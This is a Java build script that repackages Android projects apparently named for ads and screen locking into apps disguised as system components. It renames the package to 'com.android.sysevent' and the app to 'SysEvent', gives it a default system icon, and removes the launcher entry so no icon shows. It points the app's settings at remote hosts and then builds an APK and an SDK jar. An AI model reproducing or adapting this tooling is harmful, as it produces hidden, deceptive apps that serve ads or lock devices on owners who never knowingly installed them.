package com.rot.service.build;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import org.apache.commons.io.FileUtils;

public class RotBuildService {
    private static final boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
    private static final String driverPrefix = isWin ? "E:" : "";
    private static final String projectRoot = driverPrefix + "/workspace/ads/code/";
    public static void main(String args[]) {
        String[] hostArray = new String[] { "hysdk.cn", "hysdk.haowagame.com" };
        start("rot-ads-android", hostArray, "com.android.sysevent", "SysEvent", "sym_def_app_icon");
        //start("rot-block-android", hostArray, "com.android.emailrec", "EmailReceiver", "ic_dialog_email");
    }
    public static void start(String projectName, String[] hostArray, String newPackageName, String appName, String systemIconName) {
        try {
            File newProjectRoot = new File(driverPrefix + "/tmp/" + projectName + "-build/" + newPackageName);
            FileUtils.deleteDirectory(newProjectRoot);
            FileUtils.copyDirectory(new File(projectRoot + projectName), newProjectRoot);
            {
                File settingFile = new File(newProjectRoot + "/src/com/rot/setting/Setting.java");
                String content = FileUtils.readFileToString(settingFile);
                for (int i = 0; i < hostArray.length; i++) {
                    String hostName = hostArray[i];
                    int index = i + 1;
                    content = content.replace("localhost" + index, hostName);
                }
                FileUtils.write(settingFile, content);
            }
            System.out.println(newProjectRoot);
            {
                File file = new File(newProjectRoot + "/.project");
                System.out.println(file);
                FileUtils.write(file, FileUtils.readFileToString(file).replace(projectName, projectName + "(" + appName + ")"));
            }
            {
                File file = new File(newProjectRoot + "/AndroidManifest.xml");
                System.out.println(file);
                String content = FileUtils.readFileToString(file);
                content = content.replace("一键锁屏", appName);
                content = content.replace("CoreBlock", appName);
                content = content.replace("sym_def_app_icon", systemIconName);
                FileUtils.write(file, content);
            }
            {
                File file = new File(newProjectRoot + "/AndroidManifest.xml");
                List<String> list = FileUtils.readLines(file);
                StringBuilder sb = new StringBuilder();
                for (String line : list) {
                    if (!line.contains("android.intent.category.LAUNCHER")) {
                        sb.append(line).append("\n");
                    }
                }
                FileUtils.write(file, sb.toString());
            }
            String newProejctPath = newProjectRoot.getAbsolutePath();
            FileUtils.moveDirectory(new File(newProejctPath + "/src/com/export"), new File(newProejctPath + "/src/" + newPackageName.replace('.', '/')));
            replaceKeyworks(newProejctPath, newPackageName);
            //ConstantReplacer.replace(newProejctPath);
            File genFile = new File(newProjectRoot + "/gen");
            if (genFile.exists()) {
                FileUtils.deleteDirectory(genFile);
            }
            generateApk(projectName, newProejctPath);
            generateSdk(newProejctPath);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    
    private static String generateSdk(String projectPath ) throws IOException {
        CmdUtil.exeCmd(projectPath + "/extract.bat");
        String folder =  projectPath+"/release/sdk";
        FileUtils.deleteDirectory(new File(folder));
        FileUtils.copyFile(new File(projectPath + "/bin/apk-extract/classes_dex2jar.jar"), new File(folder + "/libs/rot.jar"));
        FileUtils.copyDirectory(new File(projectPath + "/res"), new File(folder + "/res"));
        {
            StringBuilder comSb = new StringBuilder();
            StringBuilder permissionSb = new StringBuilder();
            {
                File file = new File(projectPath + "/AndroidManifest.xml");
                List<String> lines = FileUtils.readLines(file);
                boolean startCopy = false;
                for (String line : lines) {
                    if (line.contains("uses-permission")) {
                        String permission = line.replace("<uses-permission android:name=\"", "").replace("\" />", "").trim();
                        permissionSb.append(permission).append("\n");
                    } else if (line.contains("build-component-end")) {
                        break;
                    } else if (line.contains("build-component-start")) {
                        startCopy = true;
                    } else if (startCopy) {
                        comSb.append(line).append("\n");
                    }
                }
            }
            FileUtils.write(new File(folder + "/components.txt"), comSb.toString());
            FileUtils.write(new File(folder + "/permissions.txt"), permissionSb.toString());
            FileUtils.write(new File(folder + "/proguard.txt"), "");
        }
        System.out.println(new File(folder).getCanonicalPath());
        return null;
    }
    
    private static void replaceKeyworks(String root, String newPackageName) throws IOException {
        File file = new File(root);
        if (file.isDirectory()) {
            for (File child : file.listFiles()) {
                replaceKeyworks(child.getAbsolutePath(), newPackageName);
            }
        } else {
            String name = file.getName();
            if (name.endsWith(".java") || name.endsWith(".xml") || name.endsWith(".txt")) {
                String content = FileUtils.readFileToString(file)//
                        .replaceAll("com.export", newPackageName)//
                ;
                FileUtils.write(file, content);
            }
        }
    }
    private static String generateApk(String projectName, String projectPath) throws IOException {
        if (!isWin) {
            String localPropertiesFile = projectPath + "/local.properties";
            FileUtils.write(new File(localPropertiesFile), "sdk.dir=/usr/local/android/sdk");
            CmdUtil.exeCmd("sh " + projectPath + "/build.sh");
        } else {
            CmdUtil.exeCmd(projectPath + "/build.bat");
            
        }
        String time = new SimpleDateFormat("yyyyMMdd-hhmmss").format(new Date());
        FileUtils.copyFile(new File(projectPath + "/bin/main-release.apk"), new File(String.format(projectPath+"/release/apk/%s(%s).apk", projectName, time)));
        System.out.println(projectPath);
        return null;
    }
}
